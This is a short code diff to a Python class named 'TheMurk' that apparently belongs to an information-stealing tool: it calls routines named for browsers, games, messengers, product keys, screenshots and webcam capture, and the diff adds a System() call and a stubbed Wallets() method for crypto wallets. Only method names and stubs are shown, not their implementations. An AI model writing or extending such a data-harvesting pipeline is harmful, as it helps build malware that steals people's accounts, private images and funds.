@@ -41,6 +41,7 @@ class TheMurk:
         self.Browsers()
         self.Games()
         self.Messagers()
+        self.System()
 
     def Start(self):
         if not config.debuging:
@@ -76,3 +77,7 @@ class TheMurk:
         ProductKey()
         Screenshot()
         WebCam()
+    
+    def Wallets(self):
+        #self.msgWallets = Wallets(self.msgWallets)
+        pass
